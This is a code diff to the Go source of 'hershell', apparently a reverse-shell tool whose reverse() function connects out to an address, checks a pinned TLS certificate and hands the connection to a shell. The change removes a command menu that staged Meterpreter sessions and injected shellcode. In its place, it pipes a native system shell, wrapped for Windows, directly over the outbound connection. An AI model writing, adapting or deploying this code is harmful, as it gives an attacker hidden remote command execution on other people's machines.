@@ -6,12 +6,10 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
+	"hershell/shell"
 	"net"
 	"os"
 	"strings"
-
-	"github.com/lesnuages/hershell/meterpreter"
-	"github.com/lesnuages/hershell/shell"
 )
 
 const (
@@ -27,8 +25,7 @@ var (
 
 func interactiveShell(conn net.Conn) {
 	var (
-		exit    = false
-		prompt  = "[hershell]> "
+		prompt  = ">>> "
 		scanner = bufio.NewScanner(conn)
 	)
 
@@ -36,47 +33,17 @@ func interactiveShell(conn net.Conn) {
 
 	for scanner.Scan() {
 		command := scanner.Text()
-		if len(command) > 1 {
-			argv := strings.Split(command, " ")
-			switch argv[0] {
-			case "meterpreter":
-				if len(argv) > 2 {
-					transport := argv[1]
-					address := argv[2]
-					ok, err := meterpreter.Meterpreter(transport, address)
-					if !ok {
-						conn.Write([]byte(err.Error() + "\n"))
-					}
-				} else {
-					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
-				}
-			case "inject":
-				if len(argv) > 1 {
-					shell.InjectShellcode(argv[1])
-				}
-			case "exit":
-				exit = true
-			case "run_shell":
-				conn.Write([]byte("Enjoy your native shell\n"))
-				runShell(conn)
-			default:
-				shell.ExecuteCmd(command, conn)
-			}
-
-			if exit {
-				break
-			}
-
-		}
+		shell.ExecuteCmd(command, conn)
 		conn.Write([]byte(prompt))
 	}
 }
 
 func runShell(conn net.Conn) {
-	var cmd = shell.GetShell()
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Stdin = conn
+	cmd := shell.GetShell()
+	wConn := shell.NewWindowsConn(conn)
+	cmd.Stdout = wConn
+	cmd.Stderr = wConn
+	cmd.Stdin = wConn
 	cmd.Run()
 }
 
@@ -107,7 +74,8 @@ func reverse(connectString string, fingerprint []byte) {
 	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(errBadFingerprint)
 	}
-	interactiveShell(conn)
+	//interactiveShell(conn)
+	runShell(conn)
 }
 
 func main() {
